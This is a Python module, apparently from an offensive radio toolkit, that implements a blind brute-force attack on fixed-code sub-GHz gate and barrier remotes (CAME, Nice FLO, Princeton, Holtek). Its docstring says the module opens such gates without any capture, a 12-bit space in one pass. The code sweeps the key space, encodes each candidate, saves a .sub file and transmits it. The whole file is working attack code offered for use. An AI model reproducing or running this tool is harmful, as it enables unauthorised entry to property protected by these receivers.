"""Blind key-space brute force over fixed-code sub-GHz protocols.

`rf.inject` needs a capture. This does not: it sweeps a protocol's code space
from a start value and fires each candidate, which opens gates and barriers
whose receiver only compares 12-24 bits and does not care where the number came
from. Expect to hit anything with a 12-bit space (CAME/Nice FLO, 4096 codes) in
one pass; 24-bit Princeton needs a targeted range.

Every candidate is synthesized by the protocol's own encoder, so the timing is
always legal for the modulation.
"""

from __future__ import annotations

import os
import time

from omni.core import config, console
from omni.core.module import Option
from omni.rf import marquee
from omni.rf.modules._base import RfModule

__all__ = ["Brute"]


class Brute(RfModule):
    NAME = "rf.brute"
    DESCRIPTION = "Blind-sweep a fixed-code key space (no capture needed)"
    OPTIONS = (Option("PROTOCOL", "CAME|Nice FLO|Princeton|Holtek", "CAME",
                      required=True, choices=tuple(marquee.PROTOCOLS)),
               Option("BITS", "bit width (blank = protocol default)"),
               Option("START", "first code in hex or dec", "0"),
               Option("COUNT", "how many codes to try", "4096"),
               Option("STEP", "stride between codes", "1"),
               Option("FREQ", "carrier in Hz", "433920000"),
               Option("PRESET", "modem preset", "AM650"),
               Option("REPEAT", "copies per code", "1"),
               Option("GAP", "extra dead air between codes, ms", "0"),
               Option("SAVE", "keep the flattened train", "true",
                      choices=("true", "false")))

    def _bits(self) -> int:
        raw = self.get("BITS")
        if raw:
            return int(raw)
        return marquee.PROTOCOLS[self.get("PROTOCOL")][1]

    def execute(self) -> dict:
        protocol = self.get("PROTOCOL")
        bits = self._bits()
        ceiling = 1 << bits
        start = int(self.get("START") or 0, 0)
        if start >= ceiling:
            raise ValueError(f"START 0x{start:X} does not fit in {bits} bit")
        count = max(1, self.get_int("COUNT", 4096))
        step = max(1, self.get_int("STEP", 1))
        freq = self.freq()
        preset = self.preset()

        codes = [(start + i * step) % ceiling for i in range(count)]
        frames = [marquee.Frame(protocol=protocol, data=code, bits=bits,
                                frequency=freq, preset=preset.short, te=0)
                  for code in codes]
        slots = marquee.plan(frames, "capture", self.get_int("REPEAT", 1))
        gap = marquee.clamp_gap(self.get_int("GAP", 0))
        budget = marquee.timing(slots, gap)
        cover = count * step
        console.kv([("protocol", protocol), ("bits", str(bits)),
                    ("range", f"0x{codes[0]:X}..0x{codes[-1]:X}"),
                    ("coverage", f"{cover}/{ceiling} "
                                 f"({100.0 * cover / ceiling:.1f}%)"),
                    ("air", f"{budget['total_ms'] / 1000:.1f}s")])
        if budget["total_ms"] > 30_000:
            console.warn("long train — the receiver may reset; raise STEP or "
                         "split into several runs")

        sub = marquee.to_sub(slots, gap)
        saved = ""
        if self.get_bool("SAVE", True):
            saved = os.path.join(
                config.output_dir("rf/brute"),
                f"brute_{protocol.replace(' ', '')}_{bits}b_"
                f"{codes[0]:X}-{codes[-1]:X}.sub")
            sub.save(saved)
            console.info(f"train kept: {saved}")

        rig = self.rig()
        try:
            sent = rig.tx().send_subfile(sub)
        finally:
            rig.close()
        console.ok(f"{sent} train(s): {count} code(s) over "
                   f"{budget['total_ms'] / 1000:.0f}s — watch for the gate moving")
        return {"sent": sent, "codes": len(codes), "protocol": protocol,
                "bits": bits, "air_ms": budget["total_ms"], "saved": saved,
                "coverage": round(100.0 * cover / ceiling, 1), "demo": rig.demo}
